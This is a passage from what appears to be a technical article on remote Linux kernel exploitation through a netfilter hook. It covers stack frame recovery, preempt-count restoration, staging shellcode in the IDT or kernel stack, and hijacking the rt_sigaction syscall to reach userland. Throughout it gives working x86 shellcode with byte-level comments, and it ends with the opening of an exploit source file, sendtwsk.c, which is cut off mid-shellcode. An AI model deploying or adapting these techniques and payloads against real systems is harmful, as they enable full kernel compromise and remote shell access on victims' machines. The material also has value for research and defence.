achieve that, we can start checking how gcc restores registers during\nfunction epilogue :\nc02b6b30 <nf_hook_slow>:\nc02b6b30:       55                      push   %ebp\nc02b6b31:       57                      push   %edi\nc02b6b32:       56                      push   %esi\nc02b6b33:       53                      push   %ebx\n[...]\nc02b6bdb:       89 d8                   mov    %ebx,%eax\nc02b6bdd:       5a                      pop    %edx       ==+\nc02b6bde:       5b                      pop    %ebx         |\nc02b6bdf:       5e                      pop    %esi         | restore\nc02b6be0:       5f                      pop    %edi         |\nc02b6be1:       5d                      pop    %ebp        =+\nc02b6be2:       c3                      ret\nThis kind of epilogue, which is common for non-short functions let us\nrecover the state of the saved register. Once we have found the 'ret'\nvalue on the stack we can start 'rolling back' counting how many 'pop' are\nthere inside the text to correctly restore those register. [*]\n[*] This is logically not the only possibility, one could set directly the\nvalues via movl, but sometimes you can't use 'predefined' values for\nthose register. As a side note, some versions of the gcc compiler\ndon't use the push\/pop prologue\/epilogue, but translate the code as a\nsequence of movl (which need a different handling from the shellcode).\nTo correctly do the 'unrolling' (and thus locate the pop sequence), we\nneed the kernel address of 'nf_hook_slow()'. This one is not hard to\ncalculate since we have already found on the stack its return addr (thanks\nto the signature pointed out before). Once again is the intel calling\nprocedures convention which help us :\n[...]\nc02bc8bd:       6a 02                   push   $0x2\nc02bc8bf:       e8 6c a2 ff ff          call   c02b6b30 <nf_hook_slow>\nc02bc8c4:       83 c4 1c                add    $0x1c,%esp\n[...]\nThat small snippet of code is taken from ip_rcv(), which is the function\ncalling nf_hook_slow(). We have found on the stack the return address,\nwhich is 0xc02bc8c4, so calculating the nf_hook_slow address is just a\nmatter of calculating the 'displacement' used in the relative call (opcode\n0xe8, the standard calling convention on kernel gcc-compiled code) and\nadding it to the return addr value (INTEL relative call convention adds\nthe displacement to the current EIP) :\n[*] call to nf_hook_slow -> 0xe8 0x6c 0x2a 0xff 0xff\n[*] nf_hook_slow address -> 0xc02bc8c4 + 0xffffa26c = 0xc02b6b30\nTo better understand the whole Stack Frame Flow Recovery approach here's\nthe shellcode stub doing it, with short comments :\n- Here we increment the stack pointer with the 'pop %eax' sequence and\ntest for the known signature [ 0x2 0x1 X X 0x0 ].\nloop:\n\"\\x58\"                  \/\/ pop    %eax\n\"\\x83\\x3c\\x24\\x02\"      \/\/ cmpl   $0x2,(%esp)\n\"\\x75\\xf9\"              \/\/ jne    loop\n\"\\x83\\x7c\\x24\\x04\\x01\"  \/\/ cmpl   $0x1,0x4(%esp)\n\"\\x75\\xf2\"              \/\/ jne    loop\n\"\\x83\\x7c\\x24\\x10\\x00\"  \/\/ cmpl   $0x0,0x10(%esp)\n\"\\x75\\xeb\"              \/\/ jne    loop\n\"\\x8d\\x64\\x24\\xfc\"      \/\/ lea    0xfffffffc(%esp),%esp\n- get the return address, subtract 4 bytes and deference the pointer to get\nthe nf_hook_slow() offset\/displacement. Add it to the return address to\nobtain the nf_hook_slow() address.\n\"\\x8b\\x04\\x24\"          \/\/ mov    (%esp),%eax\n\"\\x89\\xc3\"              \/\/ mov    %eax,%ebx\n\"\\x03\\x43\\xfc\"          \/\/ add    0xfffffffc(%ebx),%eax\n- locate the 0xc3 opcode inside nf_hook_slow(), eliminating 'spurious'\n0xc3 bytes. In this shellcode we do a simple check for 'movl' opcodes\nand that's enough to avoid 'false positive'. With a larger shellcode\none could write a small disassembly routine that would let perform a\nmore precise locating of the 'ret' and 'pop' [see later].\nincrement:\n\"\\x40\"                  \/\/ inc    %eax\n\"\\x8a\\x18\"              \/\/ mov    (%eax),%bl\n\"\\x80\\xfb\\xc3\"          \/\/ cmp    $0xc3,%bl\n\"\\x75\\xf8\"              \/\/ jne    increment\n\"\\x80\\x78\\xff\\x88\"      \/\/ cmpb   $0x88,0xffffffff(%eax)\n\"\\x74\\xf2\"              \/\/ je     increment\n\"\\x80\\x78\\xff\\x89\"      \/\/ cmpb   $0x89,0xffffffff(%eax)\n\"\\x74\\xec\"              \/\/ je     8048351 increment\n- roll back from the located 'ret' up to the last pop instruction, if\nany and count the number of 'pop's.\npop:\n\"\\x31\\xc9\"              \/\/ xor    %ecx,%ecx\n\"\\x48\"                  \/\/ dec    %eax\n\"\\x8a\\x18\"              \/\/ mov    (%eax),%bl\n\"\\x80\\xe3\\xf0\"          \/\/ and    $0xf0,%bl\n\"\\x80\\xfb\\x50\"          \/\/ cmp    $0x50,%bl\n\"\\x75\\x03\"              \/\/ jne    end\n\"\\x41\"                  \/\/ inc    %ecx\n\"\\xeb\\xf2\"              \/\/ jmp    pop\n\"\\x40\"                  \/\/ inc    %eax\n- use the calculated byte displacement from ret to rollback %esp value\n\"\\x89\\xc6\"              \/\/ mov    %eax,%esi\n\"\\x31\\xc0\"              \/\/ xor    %eax,%eax\n\"\\xb0\\x04\"              \/\/ mov    $0x4,%al\n\"\\xf7\\xe1\"              \/\/ mul    %ecx\n\"\\x29\\xc4\"              \/\/ sub    %eax,%esp\n- set the return value\n\"\\x31\\xc0\"              \/\/ xor    %eax,%eax\n- call the nf_hook_slow() function epilog\n\"\\xff\\xe6\"              \/\/ jmp    *%esi\nIt is now time to pass to the 'second step', that is restore any pending\nlock or other synchronization object to a consistent state for the\nnf_hook_slow() function.\n---[ 3.2.3 - Resource Restoring\nAt that phase we care of restoring those resources that are necessary for\nthe 'hooked return function' (and its callers) to cleanly get out from the\nsoftirq\/interrupt state.\nLet's take another (closer) look at nf_hook_slow() :\n< linux-2.6.15\/net\/netfilter\/core.c >\nint nf_hook_slow(int pf, unsigned int hook, struct sk_buff **pskb,\nstruct net_device *indev,\nstruct net_device *outdev,\nint (*okfn)(struct sk_buff *),\nint hook_thresh)\n{\nstruct list_head *elem;\nunsigned int verdict;\nint ret = 0;\n\/* We may already have this, but read-locks nest anyway *\/\nrcu_read_lock();                [1]\n[...]\nunlock:\nrcu_read_unlock();              [2]\nreturn ret;                     [3]\n}\n< \/ >\nAt [1] 'rcu_read_lock()' is invoked\/acquired, but [2] 'rcu_read_unlock()'\nis never performed, since at the 'Stack Frame Flow Recovery' step we\nunrolled the stack and jumped back at [3].\n'rcu_read_unlock()' is just an alias of preempt_enable(), which, in the\nend, results in a one-decrement of the preempt_count value inside the\nthread_info struct :\n< linux-2.6.15\/include\/linux\/rcupdate.h >\n#define rcu_read_lock()         preempt_disable()\n[...]\n#define rcu_read_unlock()       preempt_enable()\n< \/ >\n< linux-2.6.15\/include\/linux\/preempt.h >\n# define add_preempt_count(val) do { preempt_count() += (val); } while (0)\n# define sub_preempt_count(val) do { preempt_count() -= (val); } while (0)\n[...]\n#define inc_preempt_count() add_preempt_count(1)\n#define dec_preempt_count() sub_preempt_count(1)\n#define preempt_count() (current_thread_info()->preempt_count)\n#ifdef CONFIG_PREEMPT\nasmlinkage void preempt_schedule(void);\n#define preempt_disable() \\\ndo { \\\ninc_preempt_count(); \\\nbarrier(); \\\n} while (0)\n#define preempt_enable_no_resched() \\\ndo { \\\nbarrier(); \\\ndec_preempt_count(); \\\n} while (0)\n#define preempt_check_resched() \\\ndo { \\\nif (unlikely(test_thread_flag(TIF_NEED_RESCHED))) \\\npreempt_schedule(); \\\n} while (0)\n#define preempt_enable() \\\ndo { \\\npreempt_enable_no_resched(); \\\nbarrier(); \\\npreempt_check_resched(); \\\n} while (0)\n#else\n#define preempt_disable()               do { } while (0)\n#define preempt_enable_no_resched()     do { } while (0)\n#define preempt_enable()                do { } while (0)\n#define preempt_check_resched()         do { } while (0)\n#endif\n< \/ >\nAs you can see, if CONFIG_PREEMPT is not set, all those operations are\njust no-ops. 'preempt_disable()' is nestable, so it can be called multiple\ntimes (preemption will be disabled untill we call 'preempt_enable()' the\nsame number of times). That means that, given a PREEMPT kernel, we should\nfind a value equal or greater to '1' inside preempt_count at 'exploit\ntime'. We can't just ignore that value or otherwise we'll BUG() later on\ninside scheduler code (check preempt_schedule_irq() in kernel\/sched.c).\nWhat we have to do, on a PREEMPT kernel, is thus locate 'preempt_count'\nand decrement it, just like 'rcu_read_unlock()' would do.\nFor the x86 architecture , 'preempt_count' is stored inside the 'struct\nthread_info' :\n< linux-2.6.15\/include\/asm-i386\/thread_info.h >\nstruct thread_info {\nstruct task_struct      *task;          \/* main task structure *\/\nstruct exec_domain      *exec_domain;   \/* execution domain *\/\nunsigned long           flags;          \/* low level flags *\/\nunsigned long           status;         \/* thread-synchronous\nflags *\/\n__u32                   cpu;            \/* current CPU *\/\nint                     preempt_count;  \/* 0 => preemptable, <0 =>\nBUG *\/\nmm_segment_t            addr_limit;     \/* thread address space:\n0-0xBFFFFFFF for\nuser-thead\n0-0xFFFFFFFF for\nkernel-thread\n*\/\n[...]\n< \/ >\nLet's see how we get to it :\n- locate the thread_struct\n\"\\x89\\xe0\"                 \/\/ mov %esp,%eax\n\"\\x25\\x00\\xe0\\xff\\xff\"     \/\/ and $0xffffe000,%eax\n- scan the thread_struct to locate the addr_limit value. This value is a\ngood fingerprint, since it is 0xc0000000 for an userland process and\n0xffffffff for a kernel thread (or the idle task). [note that this kind\nof scan can be used to figure out in which kind of process we are,\nsomething that could be very important in some scenario]\n\/* scan: *\/\n\"\\x83\\xc0\\x04\"             \/\/ add $0x4,%eax\n\"\\x8b\\x18\"                 \/\/ mov (%eax),%ebx\n\"\\x83\\xfb\\xff\"             \/\/ cmp $0xffffffff,%ebx\n\"\\x74\\x0a\"                 \/\/ je 804851e <end>\n\"\\x81\\xfb\\x00\\x00\\x00\\xc0\" \/\/ cmp $0xc0000000,%ebx\n\"\\x74\\x02\"                 \/\/ je 804851e <end>\n\"\\xeb\\xec\"                 \/\/ jmp 804850a <scan>\n- decrement the 'preempt_count' value [which is just the member above the\naddr_limit one]\n\/* end: *\/\n\"\\xff\\x48\\xfc\"             \/\/ decl 0xfffffffc(%eax)\nTo improve further the shellcode it would be a good idea to perform a test\nover the preempt_count value, so that we would not end up into lowering it\nbelow zero.\n---[ 3.2.4 - Copying the Stub\nWe have just finished presenting a generic method to restore the stack\nafter a 'general mess-up' of the netfilter core call-frames.\nWhat we have to do now is to find some place to store our shellcode, since\nwe can't (as we said before) directly execute from inside interrupt\ncontext. [remember the note, this step and the following one are executed\nbefore getting out from the softirq context].\nSince we don't know almost anything about the remote kernel image memory\nmapping we need to find a 'safe place' to store the shellcode, that is, we\nneed to locate some memory region that we can for sure reference and that\nwon't create problems (read : Oops) if overwritten.\nThere are two places where we can copy our 'stage-2' shellcode :\n- IDT (Interrupt Descriptor Table) : we can easily get the IDT logical\naddress at runtime (as we saw previously in the NULL dereference\nexample) and Linux uses only the 0x80 software interrupt vector :\n+-----------------+\n| exeption        |\n|    entries      |\n|-----------------|\n|  hw interrupt   |\n|      entries    |\n|-----------------| entry #32 ==+\n|                 |             |\n|  soft interrupt |             |\n|      entries    |             | usable gap\n|                 |             |\n|                 |             |\n|                 |           ==+\n|  int 0x80       | entry #128\n|                 |\n+-----------------+ <- offset limit\nBetween entry #32 and entry #128 we have all unused descriptor\nentries, each 8 bytes long. Linux nowadays doesn't map that memory\narea as read-only [as it should be], so we can write on it [*].\nWe have thus : (128 - 32) * 8 = 98 * 8 = 784 bytes, which is enough\nfor our 'stage-2 shellcode'.\n[*] starting with the Linux kernel 2.6.20 it is possible to map some\nareas as read-only [the idt is just one of those]. Since we don't\n'start' writing into the IDT area and executing from there, it is\npossible to bypass that protection simply modifying directly\nkernel page tables protection in 'previous stages' of the\nshellcode.\n- the current kernel stack : we need to make a little assumption here,\nthat is being inside a process that would last for some time (untill\nwe'll be able to redirect kernel code over our shellcode, as we will\nsee in the next section).\nUsually the stack doesn't grow up to 4kb, so we have an almost free\n4kb page for us (given that the remote system is using an 8kb stack\nspace). To be safe, we can leave some pad space before the shellcode.\nWe need to take care of the 'struct thread_struct' saved at the\n'bottom' of the kernel stack (and that logically we don't want to\noverwrite ;) ) :\n+-----------------+\n| thread_struct   |\n|---------------- |  ==+\n|                 |    | usable gap\n|                 |    |\n|-----------------|  ==+\n|                 |\n|       ^         |\n|       |         |  [ normally the stack doesn't ]\n|       |         |  [ grow over 4kb              ]\n|                 |\n|  ring0 stack    |\n+-----------------+\nAlltogether we have : (8192 - 4096) - sizeof(descriptor) - pad ~= 2048\nbytes, which is even more than before.\nWith a more complex shellcode we can traverse the process table and\nlook forward for a 'safe process' (init, some kernel thread, some main\nserver process).\nLet's give a look to the shellcode performing that task :\n- get the stack address where we are [the uber-famous call\/pop trick]\n\"\\xe8\\x00\\x00\\x00\\x00\"         \/\/  call   51 <search+0x29>\n\"\\x59\"                         \/\/  pop    %ecx\n- scan the stack untill we find the 'start marker' of our stage-2 stub.\nWe put a \\xaa byte at the start of it, and it's the only one present in\nthe shellcode. The addl $10 is there just to start scanning after the\n'cmp $0xaa, %al', which would otherwise give a false positive for \\xaa.\n\"\\x83\\xc1\\x10\"                 \/\/  addl $10, %ecx\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x8a\\x01\"                     \/\/  mov    (%ecx),%al\n\"\\x3c\\xaa\"                     \/\/  cmp    $0xaa,%al\n\"\\x75\\xf9\"                     \/\/  jne    52 <search+0x2a>\n- we have found the start of the shellcode, let's copy it in the 'safe\nplace' untill the 'end marker' (\\xbb). The 'safe place' here is saved\ninside the %esi register. We haven't shown how we calculated it because\nit directly derives from the shellcode used in the next section (it's\nsimply somwhere in the stack space). This code could be optimized by\nsaving the 'stage-2' stub size in %ecx and using rep\/repnz in\nconjuction with mov instructions.\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x8a\\x01\"                     \/\/  mov    (%ecx),%al\n\"\\x88\\x06\"                     \/\/  mov    %al,(%esi)\n\"\\x46\"                         \/\/  inc    %esi\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x80\\x39\\xbb\"                 \/\/  cmpb   $0xbb,(%ecx)\n\"\\x75\\xf5\"                     \/\/  jne    5a <search+0x32>\n[during the develop phase of the exploit we have changed a couple of\ntimes the 'stage-2' part, that's why we left that kind of copy\noperation, even if it's less elegant :) ]\n---[ 3.2.5 - Executing Code in Userspace Context [Gimme Life!]\nOkay, we have a 'safe place', all we need now is a 'safe moment', that is\na process context to execute in. The first 'easy' solution that could come\nto your mind could be overwriting the #128 software interrupt [int $0x80],\nso that it points to our code. The first process issuing a system call\nwould thus become our 'victim process-context'.\nThis approach has, thou, two major drawbacks :\n- we have no way to intercept processes using sysenter to access kernel\nspace (what if all were using it ? It would be a pretty odd way to\nfail...)\n- we can't control which process is 'hooked' and that might be\n'disastrous' if the process is the init one or a critical one,\nsince we'll borrow its userspace to execute our shellcode (a bindshell\nor a connect-back is not a short-lasting process).\nWe have to go a little more deeper inside the kernel to achieve a good\nhooking. Our choice was to use the syscall table and to redirect a system\ncall which has an high degree of possibility to be called and that we're\nalmost sure that isn't used inside init or any critical process.\nOur choice, after a couple of tests, was to hook the rt_sigaction syscall,\nbut it's not the only one. It just worked pretty well for us.\nTo locate correctly in memory the syscall table we use the stub of code\nthat sd and devik presented in their phrack paper [23] about \/dev\/kmem\npatching:\n- we get the current stack address, calculate the start of the\nthread_struct and we add 0x1000 (pad gap) [simbolic value far enough\nfrom both the end of the thread_struct and the top of stack]. Here is\nwhere we set that %esi value that we have presented as 'magically\nalready there' in the shellcode-part discussed before.\n\"\\x89\\xe6\"                     \/\/  mov    %esp,%esi\n\"\\x81\\xe6\\x00\\xe0\\xff\\xff\"     \/\/  and    $0xffffe000,%esi\n\"\\x81\\xc6\\x00\\x10\\x00\\x00\"     \/\/  add    $0x1000,%esi\n- sd & devik sligthly re-adapted code.\n\"\\x0f\\x01\\x0e\"                 \/\/  sidtl  (%esi)\n\"\\x8b\\x7e\\x02\"                 \/\/  mov    0x2(%esi),%edi\n\"\\x81\\xc7\\x00\\x04\\x00\\x00\"     \/\/  add    $0x400,%edi\n\"\\x66\\x8b\\x5f\\x06\"             \/\/  mov    0x6(%edi),%bx\n\"\\xc1\\xe3\\x10\"                 \/\/  shl    $0x10,%ebx\n\"\\x66\\x8b\\x1f\"                 \/\/  mov    (%edi),%bx\n\"\\x43\"                         \/\/  inc    %ebx\n\"\\x8a\\x03\"                     \/\/  mov    (%ebx),%al\n\"\\x3c\\xff\"                     \/\/  cmp    $0xff,%al\n\"\\x75\\xf9\"                     \/\/  jne    28 <search>\n\"\\x8a\\x43\\x01\"                 \/\/  mov    0x1(%ebx),%al\n\"\\x3c\\x14\"                     \/\/  cmp    $0x14,%al\n\"\\x75\\xf2\"                     \/\/  jne    28 <search>\n\"\\x8a\\x43\\x02\"                 \/\/  mov    0x2(%ebx),%al\n\"\\x3c\\x85\"                     \/\/  cmp    $0x85,%al\n\"\\x75\\xeb\"                     \/\/  jne    28 <search>\n\"\\x8b\\x5b\\x03\"                 \/\/  mov    0x3(%ebx),%ebx\n- logically we need to save the original address of the syscall somewhere,\nand we decided to put it just before the 'stage-2' shellcode :\n\"\\x81\\xc3\\xb8\\x02\\x00\\x00\"     \/\/  add 0x2b8, %ebx\n\"\\x89\\x5e\\xf8\"                 \/\/  movl %ebx, 0xfffffff8(%esi)\n\"\\x8b\\x13\"                     \/\/  mov    (%ebx),%edx\n\"\\x89\\x56\\xfc\"                 \/\/  mov    %edx,0xfffffffc(%esi)\n\"\\x89\\x33\"                     \/\/  mov    %esi,(%ebx)\nAs you see, we save the address of the rt_sigaction entry [offset 0x2b8]\ninside syscall table (we will need it at restore time, so that we won't\nhave to calculate it again) and the original address of the function\nitself (the above counterpart in the restoring phase). We make point the\nrt_sigaction entry to our shellcode : %esi. Now it should be even clearer\nwhy, in the previous section, we had ''magically'' the destination address\nto copy our stub into in %esi.\nThe first process issuing a rt_sigaction call will just give life to the\nstage-2 shellcode, which is the final step before getting the connect-back\nor the bindshell executed. [or whatever shellcode you like more ;) ]\nWe're still in kerneland, while our final goal is to execute an userland\nshellcode, so we still have to perform a bounch of operations.\nThere are basically two methods (not the only two, but probably the easier\nand most effective ones) to achieve our goal :\n- find saved EIP, temporary disable WP control register flag, copy\nthe userland shellcode overthere and re-enable WP flag [it could be\npotentially dangerous on SMP]. If the syscall is called through\nsysenter, the saved EIP points into vsyscall table, so we must 'scan'\nthe stack 'untill ret' (not much different from what we do in the\nstack frame recovery step, just easier here), to get the real\nuserspace saved EIP after vsyscall 'return' :\n0xffffe410 <__kernel_vsyscall+16>:      pop    %ebp\n0xffffe411 <__kernel_vsyscall+17>:      pop    %edx\n0xffffe412 <__kernel_vsyscall+18>:      pop    %ecx\n0xffffe413 <__kernel_vsyscall+19>:      ret\nAs you can see, the first executed userspace address (writable) is at\nsaved *(ESP + 12).\n- find saved ESP or use syscall saved parameters pointing to an userspace\nbuffer, copy the shellcode in that memory location and overwrite the\nsaved EIP with saved ESP (or userland buffer address)\nThe second method is preferable (easier and safer), but if we're dealing\nwith an architecture supporting the NX-bit or with a software patch that\nemulates the execute bit (to mark the stack and eventually the heap as\nnon-executable), we have to fallback to the first, more intrusive, method,\nor our userland process will just segfault while attempting to execute the\nshellcode. Since we do have full control of the process-related kernel\ndata we can also copy the shellcode in a given place and modify page\nprotection. [not different from the idea proposed above for IDT read-only\nin the 'Copy the Stub' section]\nOnce again, let's go on with the dirty details :\n- the usual call\/pop trick to get the address we're executing from\n\"\\xe8\\x00\\x00\\x00\\x00\"         \/\/  call   8 <func+0x8>\n\"\\x59\"                         \/\/  pop    %ecx\n- patch back the syscall table with the original rt_sigaction address\n[if those 0xff8 and 0xffc have no meaning for you, just remember that we\nadded 0x1000 to the thread_struct stack address to calculate our 'safe\nplace' and that we stored just before both the syscall table entry\naddress of rt_sigaction and the function address itself]\n\"\\x81\\xe1\\x00\\xe0\\xff\\xff\"     \/\/  and    $0xffffe000,%ecx\n\"\\x8b\\x99\\xf8\\x0f\\x00\\x00\"     \/\/  mov    0xff8(%ecx),%ebx\n\"\\x8b\\x81\\xfc\\x0f\\x00\\x00\"     \/\/  mov    0xffc(%ecx),%eax\n\"\\x89\\x03\"                     \/\/  mov    %eax,(%ebx)\n- locate Userland ESP and overwrite Userland EIP with it [method 2]\n\"\\x8b\\x74\\x24\\x38\"             \/\/  mov    0x38(%esp),%esi\n\"\\x89\\x74\\x24\\x2c\"             \/\/  mov    %esi,0x2c(%esp)\n\"\\x31\\xc0\"                     \/\/  xor    %eax,%eax\n- once again we use a marker (\\x22) to locate the shellcode we want to\ncopy on process stack. Let's call it 'stage-3' shellcode.\nWe use just another simple trick here to locate the marker and avoid a\nfalse positive : instead of jumping after (as we did for the \\xaa one)\nwe set the '(marker value) - 1' in %al and then increment it.\nThe copy is exactly the same (with the same 'note') we saw before\n\"\\xb0\\x21\"                     \/\/  mov    $0x21,%al\n\"\\x40\"                         \/\/  inc    %eax\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x38\\x01\"                     \/\/  cmp    %al,(%ecx)\n\"\\x75\\xfb\"                     \/\/  jne    2a <func+0x2a>\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x8a\\x19\"                     \/\/  mov    (%ecx),%bl\n\"\\x88\\x1e\"                     \/\/  mov    %bl,(%esi)\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x46\"                         \/\/  inc    %esi\n\"\\x38\\x01\"                     \/\/  cmp    %al,(%ecx)\n\"\\x75\\xf6\"                     \/\/  jne    30 <func+0x30>\n- return from the syscall and let the process cleanly exit to userspace.\nControl will be transfered to our modified EIP and shellcode will be\nexecuted\n\"\\xc3\"                         \/\/  ret\nWe have used a 'fixed' value to locate userland ESP\/EIP, which worked well\nfor the 'standard' kernels\/apps we tested it on (getting to the syscall via\nint $0x80). With a little more effort (worth the time) you can avoid those\noffset assumptions by implementing a code similar to the one for the Stack\nFrame Recovery tecnique.\nJust take a look to how current userland EIP,ESP,CS and SS are saved\nbefore jumping at kernel level :\nring0 stack:\n+--------+\n| SS     |\n| ESP    |  <--- saved ESP\n| EFLAG  |\n| CS     |\n| EIP    |  <--- saved EIP\n|......  |\n+--------+\nAll 'unpatched' kernels will have the same value for SS and CS and we can\nuse it as a fingerprint to locate ESP and EIP (that we can test to be\nbelow PAGE_OFFSET [*])\n[*] As we already said, on latest kernels there could be a different\nuspace\/kspace split address than 0xc0000000 [2G\/2G or 1G\/3G\nconfigurations]\nWe won't show here the 'stage-3' shellcode since it is a standard\n'userland' bindshell one. Just use the one you need depending on the\nenvironment.\n---[ 3.2.6 - The Code : sendtwsk.c\n< stuff\/expl\/sendtwsk.c >\n#include <sys\/socket.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\n#include <netinet\/ip.h>\n#include <netinet\/udp.h>\n\/* from vuln module *\/\n#define MAX_TWSKCHUNK 30\n\/* end *\/\n#define NOP 0x90\n#define OVERFLOW_NEED   20\n#define JMP           \"\\xe9\\x07\\xfe\\xff\\xff\"\n#define SIZE_JMP      (sizeof(JMP) -1)\n#define TWSK_PACKET_LEN (((MAX_TWSKCHUNK * sizeof(struct twsk_chunk)) +\nOVERFLOW_NEED) + SIZE_JMP \\\n+ sizeof(struct twsk) + sizeof(struct iphdr))\n#define TWSK_PROTO 37\n#define DEFAULT_VSYSCALL_RET 0xffffe413\n#define DEFAULT_VSYSCALL_JMP 0xc01403c0\n\/*\n*  find the correct value..\nalpha:\/usr\/src\/linux\/debug\/article\/remote\/figaro\/ip_figaro# .\/roll\nval: 2147483680, 80000020 result: 512\nval: 2147483681, 80000021 result: 528\n*\/\n#define NEGATIVE_CHUNK_NUM 0x80000020\nchar shellcode[]=\n\/* hook sys_rtsigaction() and copy the 2level shellcode (72) *\/\n\"\\x90\\x90\"                     \/\/  nop; nop; [alignment]\n\"\\x89\\xe6\"                     \/\/  mov    %esp,%esi\n\"\\x81\\xe6\\x00\\xe0\\xff\\xff\"     \/\/  and    $0xffffe000,%esi\n\"\\x81\\xc6\\x00\\x10\\x00\\x00\"     \/\/  add    $0x1000,%esi\n\"\\x0f\\x01\\x0e\"                 \/\/  sidtl  (%esi)\n\"\\x8b\\x7e\\x02\"                 \/\/  mov    0x2(%esi),%edi\n\"\\x81\\xc7\\x00\\x04\\x00\\x00\"     \/\/  add    $0x400,%edi\n\"\\x66\\x8b\\x5f\\x06\"             \/\/  mov    0x6(%edi),%bx\n\"\\xc1\\xe3\\x10\"                 \/\/  shl    $0x10,%ebx\n\"\\x66\\x8b\\x1f\"                 \/\/  mov    (%edi),%bx\n\"\\x43\"                         \/\/  inc    %ebx\n\"\\x8a\\x03\"                     \/\/  mov    (%ebx),%al\n\"\\x3c\\xff\"                     \/\/  cmp    $0xff,%al\n\"\\x75\\xf9\"                     \/\/  jne    28 <search>\n\"\\x8a\\x43\\x01\"                 \/\/  mov    0x1(%ebx),%al\n\"\\x3c\\x14\"                     \/\/  cmp    $0x14,%al\n\"\\x75\\xf2\"                     \/\/  jne    28 <search>\n\"\\x8a\\x43\\x02\"                 \/\/  mov    0x2(%ebx),%al\n\"\\x3c\\x85\"                     \/\/  cmp    $0x85,%al\n\"\\x75\\xeb\"                     \/\/  jne    28 <search>\n\"\\x8b\\x5b\\x03\"                 \/\/  mov    0x3(%ebx),%ebx [get\nsys_call_table]\n\"\\x81\\xc3\\xb8\\x02\\x00\\x00\"     \/\/  add 0x2b8, %ebx       [get\nsys_rt_sigaction offset]\n\"\\x89\\x5e\\xf8\"                 \/\/  movl %ebx, 0xfffffff8(%esi) [save\nsys_rt_sigaction]\n\"\\x8b\\x13\"                     \/\/  mov    (%ebx),%edx\n\"\\x89\\x56\\xfc\"                 \/\/  mov    %edx,0xfffffffc(%esi)\n\"\\x89\\x33\"                     \/\/  mov    %esi,(%ebx)    [make\nsys_rt_sigaction point to our shellcode]\n\"\\xe8\\x00\\x00\\x00\\x00\"         \/\/  call   51 <search+0x29>\n\"\\x59\"                         \/\/  pop    %ecx\n\"\\x83\\xc1\\x10\"                 \/\/  addl $10, %ecx\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x8a\\x01\"                     \/\/  mov    (%ecx),%al\n\"\\x3c\\xaa\"                     \/\/  cmp    $0xaa,%al\n\"\\x75\\xf9\"                     \/\/  jne    52 <search+0x2a>\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x8a\\x01\"                     \/\/  mov    (%ecx),%al\n\"\\x88\\x06\"                     \/\/  mov    %al,(%esi)\n\"\\x46\"                         \/\/  inc    %esi\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\x80\\x39\\xbb\"                 \/\/  cmpb   $0xbb,(%ecx)\n\"\\x75\\xf5\"                     \/\/  jne    5a <search+0x32>\n\/* find and decrement preempt counter (32) *\/\n\"\\x89\\xe0\"                     \/\/  mov %esp,%eax\n\"\\x25\\x00\\xe0\\xff\\xff\"         \/\/  and $0xffffe000,%eax\n\"\\x83\\xc0\\x04\"                 \/\/  add $0x4,%eax\n\"\\x8b\\x18\"                     \/\/  mov (%eax),%ebx\n\"\\x83\\xfb\\xff\"                 \/\/  cmp $0xffffffff,%ebx\n\"\\x74\\x0a\"                     \/\/  je 804851e <end>\n\"\\x81\\xfb\\x00\\x00\\x00\\xc0\"     \/\/  cmp $0xc0000000,%ebx\n\"\\x74\\x02\"                     \/\/  je 804851e <end>\n\"\\xeb\\xec\"                     \/\/  jmp 804850a <scan>\n\"\\xff\\x48\\xfc\"                 \/\/  decl 0xfffffffc(%eax)\n\/* stack frame recovery step *\/\n\"\\x58\"                         \/\/  pop    %eax\n\"\\x83\\x3c\\x24\\x02\"             \/\/  cmpl   $0x2,(%esp)\n\"\\x75\\xf9\"                     \/\/  jne    8048330 <do_unroll>\n\"\\x83\\x7c\\x24\\x04\\x01\"         \/\/  cmpl   $0x1,0x4(%esp)\n\"\\x75\\xf2\"                     \/\/  jne    8048330 <do_unroll>\n\"\\x83\\x7c\\x24\\x10\\x00\"         \/\/  cmpl   $0x0,0x10(%esp)\n\"\\x75\\xeb\"                     \/\/  jne    8048330 <do_unroll>\n\"\\x8d\\x64\\x24\\xfc\"             \/\/  lea    0xfffffffc(%esp),%esp\n\"\\x8b\\x04\\x24\"                 \/\/  mov    (%esp),%eax\n\"\\x89\\xc3\"                     \/\/  mov    %eax,%ebx\n\"\\x03\\x43\\xfc\"                 \/\/  add    0xfffffffc(%ebx),%eax\n\"\\x40\"                         \/\/  inc    %eax\n\"\\x8a\\x18\"                     \/\/  mov    (%eax),%bl\n\"\\x80\\xfb\\xc3\"                 \/\/  cmp    $0xc3,%bl\n\"\\x75\\xf8\"                     \/\/  jne    8048351 <do_unroll+0x21>\n\"\\x80\\x78\\xff\\x88\"             \/\/  cmpb   $0x88,0xffffffff(%eax)\n\"\\x74\\xf2\"                     \/\/  je     8048351 <do_unroll+0x21>\n\"\\x80\\x78\\xff\\x89\"             \/\/  cmpb   $0x89,0xffffffff(%eax)\n\"\\x74\\xec\"                     \/\/  je     8048351 <do_unroll+0x21>\n\"\\x31\\xc9\"                     \/\/  xor    %ecx,%ecx\n\"\\x48\"                         \/\/  dec    %eax\n\"\\x8a\\x18\"                     \/\/  mov    (%eax),%bl\n\"\\x80\\xe3\\xf0\"                 \/\/  and    $0xf0,%bl\n\"\\x80\\xfb\\x50\"                 \/\/  cmp    $0x50,%bl\n\"\\x75\\x03\"                     \/\/  jne    8048375 <do_unroll+0x45>\n\"\\x41\"                         \/\/  inc    %ecx\n\"\\xeb\\xf2\"                     \/\/  jmp    8048367 <do_unroll+0x37>\n\"\\x40\"                         \/\/  inc    %eax\n\"\\x89\\xc6\"                     \/\/  mov    %eax,%esi\n\"\\x31\\xc0\"                     \/\/  xor    %eax,%eax\n\"\\xb0\\x04\"                     \/\/  mov    $0x4,%al\n\"\\xf7\\xe1\"                     \/\/  mul    %ecx\n\"\\x29\\xc4\"                     \/\/  sub    %eax,%esp\n\"\\x31\\xc0\"                     \/\/  xor    %eax,%eax\n\"\\xff\\xe6\"                     \/\/  jmp    